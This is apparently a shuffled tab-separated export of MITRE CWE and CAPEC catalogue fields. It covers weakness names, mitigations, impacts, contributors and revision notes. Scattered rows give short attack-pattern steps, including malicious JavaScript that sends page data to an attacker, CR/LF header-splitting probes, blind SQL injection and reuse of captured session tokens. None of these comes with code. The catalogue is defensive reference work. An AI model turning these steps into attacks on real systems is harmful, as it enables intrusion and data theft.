18797	91	Build and Compilation
17272	31	1000
9082	51	2014-06-23
10026	50	Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.
10975	56	ChildOf
10169	35	MITRE
15234	35	MITRE
21114	35	Cigital
13860	31	699
8357	53	The MITRE Corporation
24096	28	CWE Content Team
7791	97	Audit Log Manipulation
11177	76	2015-11-09
9544	91	Architecture and Design
22600	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
24036	89	Detailed
13662	39	2011-06-27
7164	74	1
16553	31	699
19921	35	MITRE
8704	35	MITRE
24473	35	MITRE
7681	35	MITRE
24832	35	MITRE
23502	28	CWE Content Team
15815	79	Confidentiality
6280	76	2017-01-09
17250	62	updated Potential_Mitigations, Time_of_Introduction
10934	88	Missing Required Cryptographic Step
22841	69	Incomplete
16834	35	Cigital
13921	28	CWE Content Team
13721	28	CWE Content Team
22985	62	updated Alternate_Terms, Name, Observed_Examples
18274	91	Architecture and Design
15608	33	Jason Lam
13534	35	MITRE
8703	62	updated Relationships
15198	45	Variant
9145	28	Sean Eidemiller
21655	71	2010
17886	28	CWE Content Team
15643	56	CanAlsoBe
22852	35	MITRE
23121	28	Eric Dalci
13313	54	Medium
20109	39	2011-06-01
13430	62	updated Maintenance_Notes
18636	26	Implementation
20704	39	2008-10-14
6112	69	Draft
10047	53	The MITRE Corporation
18481	35	MITRE
8273	35	MITRE
22803	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.
6648	31	1000
12318	35	MITRE
22548	85	177
22317	62	updated Relationships, Relevant_Properties, Taxonomy_Mappings, Time_of_Introduction
5850	62	updated Relationships, Taxonomy_Mappings
8812	35	MITRE
20975	62	updated Applicable_Platforms
13381	28	CWE Content Team
5738	76	2019-04-04
17292	57	Primary
7372	35	Cigital
24891	103	Primary
16909	103	Primary
9871	35	MITRE
18309	39	2014-07-30
21079	45	Base
8406	40	The session IDs used by the target host are not well protected from session theft.
20411	50	Implement robust physical security countermeasures and monitoring.
10350	28	CWE Content Team
24539	62	updated Relationships
18991	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships, Relevant_Properties
14365	50	Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.
20428	44	Moderate
24231	35	MITRE
14539	62	updated Description, Name
23291	39	2012-05-11
22293	35	MITRE
17181	101	CAPEC Content Team
21901	35	MITRE
21832	103	Primary
12862	62	updated Relationships
18882	44	SOAR Partial
20381	78	High
16415	28	CWE Content Team
12141	79	Confidentiality
22261	62	updated Description
14214	54	Medium
21717	28	CWE Content Team
8779	62	added/updated white box definitions
15751	62	updated Causal_Nature, Relationships
25029	35	MITRE
24786	62	updated Potential_Mitigations
18868	85	500
7362	80	To send small XML messages
13941	39	2009-03-10
8353	35	MITRE
11914	42	Non-web applications may have a main() method that contains a System.exit(), but generally should not call System.exit() from other locations in the code
21068	28	CWE Content Team
17860	35	MITRE
21741	101	CAPEC Content Team
13320	42	Perform data validation (e.g. syntax, length, etc.) before interpreting the data.
19721	63	Reduce Performance
17214	39	2012-10-30
11540	39	2011-06-01
14359	39	2011-03-29
24688	103	Primary
18713	69	Incomplete
13293	90	C
11473	62	updated Relationships
9585	33	David LeBlanc
24427	85	8
13612	73	Use an automated tool to record the variables passed to a flash file.
19267	35	Cigital
22295	21	PLOVER
9525	79	Integrity
8106	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
22400	35	MITRE
5842	23	An attacker creates a transparent overlay using flash in order to intercept user actions for the purpose of performing a clickjacking attack. In this technique, the Flash file provides a transparent overlay over HTML content. Because the Flash application is on top of the content, user actions, such as clicks, are caught by the Flash application rather than the underlying HTML. The action is then interpreted by the overlay to perform the actions the attacker wishes.
9284	62	updated Potential_Mitigations
7464	28	CWE Content Team
22623	88	Critical Data Element Declared Public
6249	47	Unreliable Execution
20549	101	CAPEC Content Team
9897	102	ChildOf
9689	28	CWE Content Team
21383	62	updated Type
17475	62	updated Common_Consequences
14184	56	ChildOf
7028	101	CAPEC Content Team
24440	46	While logging all information may be helpful during development stages, it is important that logging levels be set appropriately before a product ships so that sensitive user data and system information are not accidentally exposed to potential attackers.             Different log files may be produced and stored for:                             Server log files (e.g. server.log).  This can give information on whatever application left the file. Usually this can give full path names and system information, and sometimes usernames and passwords.                log files that are used for debugging
14153	94	Successful parameter injection attacks mean a compromise to integrity of the application.
16607	81	Availability
8734	28	CWE Content Team
7287	80	Able to develop a malicious BIOS image with the original functionality as a normal BIOS image, but with added functionality that allows for later compromise and/or disruption.
5770	69	Incomplete
9804	92	Explore
18341	42	Remove debug log files before deploying the application into production.
16943	42	Inputs should be decoded and canonicalized to the application's current internal representation before being validated (CWE-180). Make sure that the application does not decode the same input twice (CWE-174). Such errors could be used to bypass whitelist validation schemes by introducing dangerous inputs after they have been checked.
18785	62	updated Relationships
19780	71	2007
21923	35	MITRE
23589	31	1000
12184	78	Medium
25288	69	Draft
24726	88	finalize() Method Declared Public
8451	50	Implementation: Perform input validation for all remote content.
8990	28	CWE Content Team
14935	32	The Open Web Application Security Project (OWASP)
8297	35	MITRE
19517	24	MITRE
17537	28	CWE Content Team
11030	76	2019-04-04
18500	35	MITRE
12043	39	2008-10-14
16445	56	ChildOf
16881	47	Read Data
15481	43	Simple
13104	35	MITRE
24800	35	MITRE
10023	74	3
12089	39	2014-07-30
11554	35	MITRE
16370	46	When the user interface does not properly reflect what the user asks of it, then it can lead the user into a false sense of security. For example, the user might check a box to enable a security option to enable encrypted communications, but the software does not actually enable the encryption. Alternately, the user might provide a "restrict ALL'" access control rule, but the software only implements "restrict SOME".
12963	104	11
11572	39	2010-06-21
14358	90	Perl
18880	102	ChildOf
19791	28	CWE Content Team
11265	39	2008-07-01
13960	92	Explore
14262	91	Operation
8494	35	MITRE
22267	103	Primary
22328	40	The attacker must have direct access to the target server in order to successfully mount a reflection attack. An intermediate entity, such as a router or proxy, that handles these exchanges on behalf of the attacker inhibits the attackers' ability to attack the authentication protocol.
14518	59	Updated Related_Attack_Patterns
24329	39	2012-05-11
13355	46	Information contained within a CVS subdirectory on a web server or other server could be recovered by an attacker and used for malicious purposes. This information may include usernames, filenames, path root, and IP addresses.
19281	28	CWE Content Team
11702	36	https://vulncat.hpefod.com/en
11452	25	High
15010	35	MITRE
8114	35	MITRE
20998	39	2008-09-08
24386	35	MITRE
12870	66	Thread-Specifc Storage for C/C++
8991	90	Language-Independent
18210	23	The product, while copying or cloning a resource, does not set the resource's permissions or access control until the copy is complete, leaving the resource exposed to other spheres while the copy is taking place.
16300	28	CWE Content Team
9527	62	updated Relationships
21059	39	2019-01-03
11688	85	96
5926	33	Taimur Aslam
23066	97	Interception
6526	53	The MITRE Corporation
16473	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
15728	62	updated Relationships, Taxonomy_Mappings
20852	103	Primary
13227	44	SOAR Partial
20611	79	Availability
13068	103	Primary
15982	35	MITRE
16623	92	Explore
22959	92	Experiment
22110	79	Authorization
17605	90	Java
23530	39	2017-11-08
22389	79	Non-Repudiation
9647	26	Implementation
21151	28	Sean Eidemiller
15366	56	ChildOf
12436	56	ChildOf
10611	39	2011-06-01
7542	78	High
16935	79	Authorization
16370	43	Simple
23805	91	Architecture and Design
10787	103	Primary
8928	23	An adversary takes advantage of incorrectly configured SSL communications that enables access to data intended to be encrypted. The adversary may also use this type of attack to inject commands or other traffic into the encrypted stream to cause compromise of either the client or server.
23448	39	2008-09-08
6053	62	updated Common_Consequences
24332	104	295
14060	35	MITRE
12621	63	Bypass Protection Mechanism
24966	35	MITRE
6390	50	Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.
15294	103	Primary
12083	28	Eric Dalci
23634	35	MITRE
23004	95	[Survey application] Using a browser or an automated tool, an adversary follows all public links on a web site. He records all the links he finds.
14339	59	Updated Related_Weaknesses
16057	54	Low
11259	63	Alter Execution Logic
14808	28	CWE Content Team
17092	35	MITRE
7994	28	CWE Content Team
8700	49	2005
15579	62	updated Time_of_Introduction
7419	39	2009-01-12
6218	78	Very High
8250	50	Keep patches up to date by installing weekly or daily if possible.
19678	39	2009-05-27
12727	49	2008
17899	101	CAPEC Content Team
21539	62	updated Detection_Factors, Relationships
22900	104	1037
21485	35	MITRE
7766	35	MITRE
10139	46	This issue makes it more difficult to maintain the software, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
12216	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
9273	63	Gain Privileges or Assume Identity
9626	50	Patch installed applications as soon as new updates become available.
19150	78	High
16653	39	2009-12-28
18774	85	189
11563	91	Architecture and Design
10964	30	David Wagner
17721	28	CWE Content Team
14898	62	updated Relationships
17427	35	MITRE
11385	39	2011-06-01
23722	45	Class
17851	57	Indirect
19834	39	2017-11-08
9344	62	updated Demonstrative_Examples
5763	91	Architecture and Design
13971	62	updated Relationships
16726	79	Confidentiality
24447	43	Simple
7734	28	CWE Content Team
24485	39	2012-05-11
14665	39	2011-06-01
7512	88	Data Access Operations Outside of Expected Data Manager Component
6090	23	Using an empty string as a password is insecure.
19716	85	302
15196	78	High
14794	85	129
8028	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Type
19022	35	MITRE
10120	28	CWE Content Team
14585	28	CWE Content Team
22744	40	No third party intervention is required to use the password recovery mechanism.
12705	76	2019-04-04
24587	73	Brute force to guess all function names/action with different privileges.
8349	101	CAPEC Content Team
24039	33	Alex Yumashev
21018	62	updated Common_Consequences
25351	26	Architecture and Design
10050	31	1000
17473	35	MITRE
24136	39	2010-09-27
9240	62	updated Relationships, Taxonomy_Mappings
10326	73	If the secret was chosen by a person, social engineering and simple espionage can indicate patterns in their secret selection. If old secrets can be learned (and a target may feel they have little need to protect a secret that has been replaced) hints as to their selection preferences can be gleaned. These can include character substitutions a target employs, patterns in sources (dates, famous phrases, music lyrics, family members, etc.). Once these patterns have been determined, the initial efforts of a brute-force attack can focus on these areas.
9720	62	updated Relationships
21271	35	MITRE
20936	35	MITRE
15201	39	2018-03-27
19974	63	Modify Application Data
7160	56	CanPrecede
10638	62	updated Alternate_Terms, Applicable_Platforms, Relationships, Taxonomy_Mappings
18976	78	Medium
11910	62	updated Relationships, Weakness_Ordinalities
10879	91	Implementation
16362	35	MITRE
17112	100	The MITRE Corporation
11097	81	Confidentiality
11363	103	Primary
5767	26	Operation
7639	25	Medium
13281	45	Variant
21840	42	Compartmentalize the system to have "safe" areas where trust boundaries can be unambiguously drawn. Do not allow sensitive data to go outside of the trust boundary and always be careful when interfacing with a compartment outside of the safe area.                   Ensure that appropriate compartmentalization is built into the system design and that the compartmentalization serves to allow for and further reinforce privilege separation functionality. Architects and designers should rely on the principle of least privilege to decide when it is appropriate to use and to drop system privileges.
9838	62	updated Relationships
24454	85	560
22744	40	Password recovery mechanism relies only on something the user knows and not something the user has.
18284	47	Read Data
11944	62	updated Relationships, Taxonomy_Mappings
25388	103	Primary
13200	59	Updated Related_Attack_Patterns
8776	57	Resultant
11793	35	MITRE
7366	43	Simple
6556	62	updated Causal_Nature
10416	31	699
15327	35	MITRE
21702	47	Modify Data
16260	56	ChildOf
12738	28	Eric Dalci
20800	103	Primary
21160	43	Simple
22711	35	MITRE
20001	28	CWE Content Team
25256	39	2017-11-08
21033	49	2008
21908	46	The Enterprise JavaBeans specification requires that every bean provider follow a set of programming guidelines designed to ensure that the bean will be portable and behave consistently in any EJB container. In this case, the program violates the following EJB guideline: "An enterprise bean must not use thread synchronization primitives to synchronize execution of multiple instances." The specification justifies this requirement in the following way: "This rule is required to ensure consistent runtime semantics because while some EJB containers may use a single JVM to execute all enterprise bean's instances, others may distribute the instances across multiple JVMs."
14239	89	Detailed
11769	28	CWE Content Team
12686	62	updated Description, Other_Notes, Relationship_Notes
22926	39	2009-03-10
7774	39	2008-09-08
17032	51	2014-06-23
24218	36	http://samate.nist.gov/SRD/view_testcase.php?tID=1511
15160	39	2017-01-19
18645	39	2011-06-01
6086	26	Architecture and Design
8280	56	ChildOf
6362	62	updated Applicable_Platforms, Taxonomy_Mappings
20226	101	CAPEC Content Team
18590	35	MITRE
12472	77	Dynamic Analysis with Automated Results Interpretation
10029	28	Eric Dalci
20854	39	2017-11-08
9623	90	Java
21250	47	Other
15459	79	Authorization
15025	63	Read Files or Directories
15844	45	Base
6222	103	Primary
7765	28	CWE Content Team
22694	96	2018-07-02
7803	42	When applicable, ensure that the regular expression marks beginning and ending string patterns, such as "/^string$/" for Perl.
7512	104	1057
14314	55	CAPEC Content Team
7000	62	updated Applicable_Platforms, Description, Detection_Factors, Other_Notes, Potential_Mitigations, Relationships, Taxonomy_Mappings, Time_of_Introduction
14275	28	Eric Dalci
14266	26	Implementation
20669	39	2011-06-27
23870	35	MITRE
14484	39	2008-10-14
24494	94	Run Arbitrary Code
17407	88	Omitted Break Statement in Switch
16472	39	2012-05-11
19828	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description, Related_Attack_Patterns, Resources_Required, Typical_Likelihood_of_Exploit
18240	28	CWE Content Team
13133	97	Protocol Manipulation
24002	77	Automated Static Analysis - Binary or Bytecode
6790	81	Confidentiality
21315	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
14627	31	699
18900	50	Use a strict session management mechanism that only accepts locally generated session identifiers: This prevents attackers from fixating session identifiers of their own choice.
10843	31	1000
15022	51	2014-06-23
9845	46	On Windows systems the VirtualLock function can lock a page of memory to ensure that it will remain present in memory and not be swapped to disk. However, on older versions of Windows, such as 95, 98, or Me, the VirtualLock() function is only a stub and provides no protection. On POSIX systems the mlock() call ensures that a page will stay resident in memory but does not guarantee that the page will not appear in the swap. Therefore, it is unsuitable for use as a protection mechanism for sensitive data. Some platforms, in particular Linux, do make the guarantee that the page will not be swapped, but this is non-standard and is not portable. Calls to mlock() also require supervisor privilege. Return values for both of these calls must be checked to ensure that the lock operation was actually successful.
15713	62	updated References
21747	39	2010-12-13
13853	62	updated Demonstrative_Examples, References, Relationships
21880	42	Handle exceptions internally and do not display errors containing potentially sensitive information to a user. Create default error pages if necessary.
12933	32	The Wikimedia Foundation, Inc
16449	73	Use "Blind SQL Injection" techniques to extract information about the database schema.
13416	35	MITRE
17287	47	Other
9616	91	Build and Compilation
10517	62	updated Relationships
24239	91	Operation
20479	28	CWE Content Team
19698	28	CWE Content Team
12539	89	Detailed
18635	103	Primary
20766	43	Simple
20010	62	updated Relationships, Other_Notes, Taxonomy_Mappings
9073	35	Cigital
15437	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
24571	62	updated Relationships, Taxonomy_Mappings
24571	28	CWE Content Team
21007	76	2018-07-31
6187	63	Gain Privileges or Assume Identity
22714	35	MITRE
18407	21	PLOVER
25318	91	Implementation
13163	28	CWE Content Team
11336	81	Confidentiality
9895	56	ChildOf
8524	51	2014-06-23
14861	86	http://www.phreedom.org/research/rogue-ca/
15610	88	Improper Restriction of Excessive Authentication Attempts
9716	47	Read Data
7006	35	MITRE
12311	43	Simple
7499	31	1000
16984	62	updated Observed_Examples, Relationships
16517	62	updated Relationships, Taxonomy_Mappings
8266	63	Bypass Protection Mechanism
24475	39	2010-02-16
21802	35	MITRE
9642	35	MITRE
6777	94	The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the software from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the software.
19045	79	Authorization
11956	88	Always-Incorrect Control Flow Implementation
11078	39	2013-02-21
13478	100	The MITRE Corporation
8659	44	SOAR Partial
9660	25	Medium
16634	42	Choose a language that is not subject to this flaw.
18229	63	DoS: Instability
7038	62	updated Applicable_Platforms, Demonstrative_Examples, Enabling_Factors_for_Exploitation, Modes_of_Introduction, Observed_Examples, Relationships
10736	62	updated Common_Consequences
14297	51	2014-06-23
11535	81	Confidentiality
10216	45	Variant
12906	28	CWE Content Team
6916	97	Create Malicious Client
7704	39	2012-05-11
12221	97	Malicious Software Download
14728	79	Confidentiality
22724	62	updated Common_Consequences
15270	39	2012-10-30
23525	35	MITRE
13581	28	CWE Content Team
13504	101	CAPEC Content Team
24178	62	updated Common_Consequences, Potential_Mitigations, References
17650	39	2011-06-01
20130	28	CWE Content Team
13818	101	CAPEC Content Team
6432	62	updated Common_Consequences
22485	62	updated Relationships
9036	74	2
11360	21	CWE Content Team
20284	63	Read Application Data
20888	42	Use naming conventions and strong types to make it easier to spot when sensitive data is being used. When creating structures, objects, or other complex entities, separate the sensitive and non-sensitive data as much as possible.
24031	35	MITRE
20918	28	CWE Content Team
14875	42	Use public setter methods that govern how a private member can be modified.
6834	35	MITRE
19184	101	CAPEC Content Team
9495	28	CWE Content Team
14146	104	1119
25402	88	Insufficient Type Distinction
23701	35	MITRE
20303	62	updated Relationships, Taxonomy_Mappings
10144	78	Very High
7760	62	updated Observed_Examples
23302	91	Implementation
8438	44	SOAR Partial
15439	86	http://www.omg.org/spec/ASCPEM/1.0
19066	25	High
12564	99	Wikipedia
24395	56	ChildOf
19092	100	The MITRE Corporation
10435	95	When the victim requests the URL for the site, the poisoned records direct the victim to the attackers' system rather than the original one.
24075	91	Implementation
21878	43	Simple
15050	50	Design: Sanitize incoming DTDs to prevent excessive expansion or other actions that could result in impacts like resource depletion.
6031	70	Wikipedia
11643	39	2018-03-27
21124	97	Target Influence via Instant Rapport
13817	104	76
17632	81	Availability
11373	35	MITRE
23832	102	ChildOf
21206	26	Implementation
24415	35	MITRE
11563	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
19417	28	CWE Content Team
13550	50	Design: Enforce principle of least privilege
11896	21	PLOVER
24793	62	updated Relationships, Other_Notes, Taxonomy_Mappings
24532	74	2
18602	79	Confidentiality
12547	35	MITRE
23920	24	MITRE
9790	28	CWE Content Team
15024	79	Confidentiality
6170	101	CAPEC Content Team
22671	39	2009-01-12
24867	52	This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.                   Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.
18160	63	Execute Unauthorized Code or Commands
23020	56	ChildOf
24831	42	Use and specify an output encoding that can be handled by the downstream component that is reading the output. Common encodings include ISO-8859-1, UTF-7, and UTF-8. When an encoding is not specified, a downstream component may choose a different encoding, either by assuming a default encoding or automatically inferring which encoding is being used, which can be erroneous. When the encodings are inconsistent, the downstream component might treat some character or byte sequences as special, even if they are not special in the original encoding. Attackers might then be able to exploit this discrepancy and conduct injection attacks; they even might be able to bypass protection mechanisms that assume the original encoding is also being used by the downstream component.                   The problem of inconsistent output encodings often arises in web pages. If an encoding is not specified in an HTTP header, web browsers often guess about which encoding is being used. This can open up the browser to subtle XSS attacks.
18868	40	An adversary must be able install a purpose built malicious application onto the device and convince the user to execute it. The malicious application is designed to target a specific web application and is used to load the target web pages via the WebView component. For example, an adversary may develop an application that interacts with Facebook via WebView and adds a new feature that a user desires. The user would install this 3rd party app instead of the Facebook app.
16261	79	Availability
9189	62	updated Demonstrative_Examples
15391	59	Updated Attack_Phases
22970	62	updated Description, Other_Notes, Potential_Mitigations
18986	101	CAPEC Content Team
7194	28	CWE Content Team
24659	35	MITRE
12654	73	Send bad requests or requests of nonexistent pages to the server.
6991	104	538
18543	69	Incomplete
24954	39	2011-03-29
23935	31	1000
13257	39	2008-07-01
15841	95	[Insert captured session token] The attacker attempts to insert a captured session token into communication with the targeted application to confirm viability for exploitation.
21123	74	1
18412	62	updated Potential_Mitigations
8401	57	Primary
13830	56	ChildOf
17228	35	MITRE
13841	91	Implementation
9888	88	Free of Pointer not at Start of Buffer
24664	39	2014-07-30
10617	61	Draft
18210	57	Primary
21583	35	MITRE
10943	62	updated Potential_Mitigations
9224	86	https://www.amazon.com/Exploiting-Software-How-Break-Code/dp/0201786958
7133	49	2015
12420	100	The MITRE Corporation
18159	62	updated Potential_Mitigations
6881	28	CWE Content Team
10457	39	2011-09-13
18503	63	Bypass Protection Mechanism
19311	45	Base
21364	91	Architecture and Design
15945	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.
5597	100	The MITRE Corporation
9949	39	2011-06-01
22794	62	updated References, Type
25115	26	Architecture and Design
8657	39	2012-05-11
24804	67	High
6374	35	MITRE
18443	62	updated Common_Consequences
9943	28	CWE Content Team
21801	62	updated Time_of_Introduction
10669	53	The MITRE Corporation
15731	39	2012-10-30
12029	103	Primary
10057	26	Implementation
17954	81	Confidentiality
19268	39	2009-10-29
7306	45	Base
24102	79	Authorization
22057	85	126
13679	40	In order to feasibly execute this class of attacks, the adversary must have the ability to hijack a privileged thread.This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or providing malformed user-controllable input that causes the executing thread to fault and return to a higher privilege level or such.This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute.
25034	31	1000
8492	77	Automated Static Analysis - Source Code
12358	62	updated Relationships
5936	61	Draft
11596	45	Variant
11858	88	Insufficient Adherence to Expected Conventions
10620	56	ChildOf
7114	60	30
10719	28	CWE Content Team
7161	28	CWE Content Team
14780	44	Limited
6820	35	MITRE
10836	21	Anonymous Tool Vendor (under NDA)
25117	35	MITRE
17024	44	SOAR Partial
16843	33	Burt Kaliski
5642	62	updated Common_Consequences, Enabling_Factors_for_Exploitation, Relationships
20621	35	Cigital
17647	26	Operation
9694	62	updated Demonstrative_Examples
10814	104	278
18451	91	Architecture and Design
8536	39	2017-11-08
16093	26	Implementation
7334	81	Confidentiality
12085	56	ChildOf
22239	39	2009-03-10
9339	62	updated Observed_Examples, Potential_Mitigations
6490	91	Implementation
11265	35	Cigital
25222	57	Resultant
10091	95	[Determine application/system inputs where bypassing input validation is desired] The attacker first needs to determine all of the application's/system's inputs where input validation is being performed and where he/she wants to bypass it.
19293	53	The MITRE Corporation
20578	103	Primary
15489	35	MITRE
17129	39	2012-05-11
6083	71	2002
24758	47	Execute Unauthorized Commands
21957	62	updated Applicable_Platforms
17019	28	CWE Content Team
23853	39	2010-02-16
24960	63	Varies by Context
20738	46	Depending on the capabilities of the query language, an attacker could inject additional logic into the query to:                                                Modify the intended selection criteria, thus changing which data entities (e.g., records) are returned, modified, or otherwise manipulated                   Append additional commands to the query                   Return more entities than intended                   Return fewer entities than intended                   Cause entities to be sorted in an unexpected way                                          The ability to execute additional commands or change which entities are returned has obvious risks. But when the application logic depends on the order or number of entities, this can also lead to vulnerabilities. For example, if the application query expects to return only one entity that specifies an administrative user, but an attacker can change which entities are returned, this could cause the logic to return information for a regular user and incorrectly assume that the user has administrative privileges.             While this weakness is most commonly associated with SQL injection, there are many other query languages that are also subject to injection attacks, including HTSQL, LDAP, DQL, XQuery, Xpath, and "NoSQL" languages.
20803	62	updated Relationships
14030	81	Integrity
9490	62	updated Time_of_Introduction
20005	62	updated Description, Maintenance_Notes, Potential_Mitigations
13268	56	ChildOf
12169	76	2017-01-09
7249	39	2017-11-08
9319	35	MITRE
25230	90	Language-Independent
25199	80	Knowledge of how to block access to libraries, as well as knowledge of how to leverage the resulting state of the application based on the failed call.
11421	39	2012-05-11
11805	79	Non-Repudiation
22217	76	2019-04-04
22738	62	updated Common_Consequences
21195	91	Implementation
11734	28	CWE Content Team
21874	39	2014-07-30
20040	104	439
21366	32	The Sys-Security Group
22120	94	The injection of specific content into a connection can trigger a disruption in that communications channel, thereby denying availability of the service.
13610	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
7390	33	Yuval Yarom
21805	56	ChildOf
6727	62	updated Taxonomy_Mappings
9670	27	A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, "Port Unreachable..
24744	101	CAPEC Content Team
6778	74	2
20642	62	updated Applicable_Platforms
7420	56	ChildOf
14648	39	2011-06-27
20549	76	2017-05-01
8081	28	CWE Content Team
9102	91	Implementation
17117	61	Draft
15431	81	Access Control
18930	62	updated Relationships, Observed_Example, Taxonomy_Mappings
15476	56	ChildOf
14974	60	05
11581	35	Cigital
14594	74	2
16426	35	MITRE
7439	24	MITRE
5959	31	700
11546	28	Eric Dalci
21759	42	When locking and unlocking a resource, try to be sure that all control paths through the code in which the resource is locked one or more times correspond to exactly as many unlocks. If the software acquires a lock and then determines it is not able to perform its intended behavior, be sure to release the lock(s) before waiting for conditions to improve. Reacquire the lock(s) before trying again.
18291	50	Identify programs that may be used to acquire service information and block them by using a software restriction policy or tools that restrict program execution by process whitelisting.
13053	101	CAPEC Content Team
7501	66	The target="_blank" vulnerability by example
19750	54	High
9994	39	2011-06-01
19367	21	PLOVER
20340	81	Integrity
23265	28	CWE Content Team
11210	34	This weakness may occur when characters from various character sets are allowed to be interchanged within a URL, username, email address, etc. without any notification to the user or underlying system being used.
13950	62	updated Taxonomy_Mappings
13159	85	518
17625	39	2011-03-29
11459	101	CAPEC Content Team
7921	26	Implementation
16336	30	Kopo M. Ramokapane
14745	88	Failure to Sanitize Special Element
20165	56	ChildOf
22436	47	Gain Privileges
20347	51	2014-06-23
21204	43	Simple
7890	35	MITRE
24575	28	CWE Content Team
12653	101	CAPEC Content Team
16224	39	2017-11-08
16454	28	CWE Content Team
10256	39	2012-05-11
16455	21	WASC
11364	62	updated Type
6792	36	http://en.wikipedia.org/wiki/Reverse_engineering
15117	39	2008-07-01
15758	28	CWE Content Team
21902	39	2012-05-11
15777	31	1000
18546	45	Variant
5962	63	Read Application Data
16714	39	2011-06-27
16403	39	2011-06-01
7535	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
6097	28	CWE Content Team
10624	91	Implementation
19271	46	This issue makes it more difficult to maintain the software due to insufficient legibility, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.  It also might make it easier to introduce vulnerabilities.
9816	39	2014-07-30
11746	101	CAPEC Content Team
25099	42	Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").
19420	51	2014-06-23
10218	100	The MITRE Corporation
17769	71	2017
22326	62	updated Common_Consequences
11993	101	CAPEC Content Team
9586	69	Incomplete
9372	81	Integrity
10067	73	Use CR\LF characters (encoded or not) in the payloads in order to see if the HTTP header can be split.
19662	86	http://seclists.org/bugtraq/2005/Nov/30
10012	69	Incomplete
23849	100	The MITRE Corporation
8177	61	Draft
24771	51	2014-06-23
12025	21	PLOVER
10089	46	Path equivalence is usually employed in order to circumvent access controls expressed using an incomplete set of file name or file path representations. This is different from path traversal, wherein the manipulations are performed to generate a name for a different object.
16188	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Other_Notes, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
17255	28	CWE Content Team
17014	35	MITRE
9751	35	MITRE
19366	94	By faking the source of data or services, an adversary can cause a target to make incorrect decisions about how to proceed.
7837	28	CWE Content Team
6814	62	updated Related_Attack_Patterns, Relationships
21073	35	MITRE
22403	61	Draft
8520	35	MITRE
5738	101	CAPEC Content Team
14288	23	An unused validation form indicates that validation logic is not up-to-date.
23709	28	CWE Content Team
24238	62	updated Modes_of_Introduction, Other_Notes, Weakness_Ordinalities
19098	100	The MITRE Corporation
10265	77	Black Box
16426	39	2011-06-27
17162	71	2005
24959	88	Comparison of Object References Instead of Object Contents
10040	35	MITRE
22498	35	MITRE
8600	63	Bypass Protection Mechanism
22470	28	CWE Content Team
8521	76	2015-11-09
5784	85	442
7811	50	Implementation: The victim should configure the browser to minimize active content from untrusted sources.
8307	89	Standard
17475	35	MITRE
22442	28	CWE Content Team
9325	59	Updated @Abstraction
14355	39	2009-07-27
17955	60	13
10562	81	Confidentiality
6366	62	updated Potential_Mitigations
10459	23	An adversary may execute a flooding attack using the ICMP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. A typical attack involves a victim server receiving ICMP packets at a high rate from a wide range of source addresses. Additionally, due to the session-less nature of the ICMP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.
12233	50	Treat all user input as untrusted data that must be validated before use.
6001	61	Draft
15809	39	2011-09-13
6014	56	PeerOf
21813	42	With Struts, write all data from form beans with the bean's filter attribute set to true.
5697	39	2017-11-08
22600	35	MITRE
7646	62	updated Demonstrative_Examples
14516	103	Primary
12422	105	Web Based
19021	90	C++
5775	35	MITRE
6807	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
5955	77	Manual Static Analysis - Source Code
18667	72	Any data in a Java package can be accessed outside of the Java framework if the package is distributed.
23838	28	CWE Content Team
22197	62	updated Related_Attack_Patterns
13023	69	Incomplete
17980	39	2014-07-30
17263	28	CWE Content Team
17112	76	2018-07-31
20866	103	Primary
13683	79	Integrity
25412	35	MITRE
23600	39	2017-11-08
17291	103	Primary
23785	26	Implementation
24735	57	Resultant
14524	81	Integrity
17407	46	This can lead to critical code executing in situations where it should not.
24710	63	DoS: Crash, Exit, or Restart
15565	39	2011-06-27
9458	39	2011-06-01
9008	21	CWE Content Team
19080	28	CWE Content Team
17326	45	Class
23373	62	updated Other_Notes, Relationship_Notes
17963	59	Updated Related_Attack_Patterns, Typical_Likelihood_of_Exploit
24882	78	Low
19296	28	CWE Content Team
